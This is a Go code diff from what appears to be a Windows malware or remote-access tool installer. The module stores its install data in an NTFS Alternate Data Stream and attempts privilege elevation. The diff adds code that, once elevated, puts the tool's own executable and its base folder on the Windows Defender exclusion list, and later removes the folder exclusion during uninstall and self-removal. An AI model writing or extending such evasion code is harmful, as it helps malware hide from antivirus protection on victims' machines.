@@ -13,10 +13,11 @@ import (
 )
 
 type installInfo struct {
-	Loaded bool
-	Base   string
-	Date   time.Time
-	PType  int
+	Loaded    bool
+	Base      string
+	Date      time.Time
+	PType     int
+	Exclusion bool
 }
 
 //Info contains persistent configuration details
@@ -29,11 +30,7 @@ const (
 //IsInstalled checks whether or not a valid Base is already present on the system.
 func IsInstalled() bool {
 	_, err := os.Stat(os.Args[0] + ":" + util.Ads)
-	if os.IsNotExist(err) {
-		log.Println("Install info does not exist")
-		return false
-	}
-	return true
+	return !os.IsNotExist(err)
 }
 
 //WriteInstallInfo dumps the current configuration to an Alternate Data Stream in binary format.
@@ -90,14 +87,32 @@ func Install() {
 	defer util.Calm()
 	Info.Date = time.Now()
 
+	admin := false
 	log.Println("Attempting elevation")
-	err := util.ElevateLogic()
-	log.Println("Elevation error:", err)
+	if err := util.ElevateLogic(); err != nil {
+		log.Println("Elevation error:", err)
+	} else {
+		admin = true
+		if err = util.AddDefenderExclusion(os.Args[0]); err != nil {
+			log.Println("Adding initial exclusion failed,", err)
+		} else {
+			log.Println("Initial exclusion added successfully")
+		}
+	}
 
 	base, err := CreateBase()
 	util.Handle(err, "Base creation failed")
 	Info.Base = base
 	log.Println("Base set:", base)
+
+	if admin {
+		if err = util.AddDefenderExclusion(base); err != nil {
+			log.Println("Adding base exclusion failed,", err)
+		} else {
+			Info.Exclusion = true
+			log.Println("Base exclusion added successfully")
+		}
+	}
 
 	err = CopyExecutable()
 	if err != nil {
@@ -142,6 +157,12 @@ func Uninstall() [4]string {
 	}
 	if err := UninstallFolder(); err != nil {
 		r[3] = "failed"
+	}
+
+	if err := util.RemoveDefenderExclusion(Info.Base); err != nil {
+		log.Println("Failed to remove base exclusion,", err)
+	} else {
+		log.Println("Base exclusion removed successfully")
 	}
 
 	//Remove self
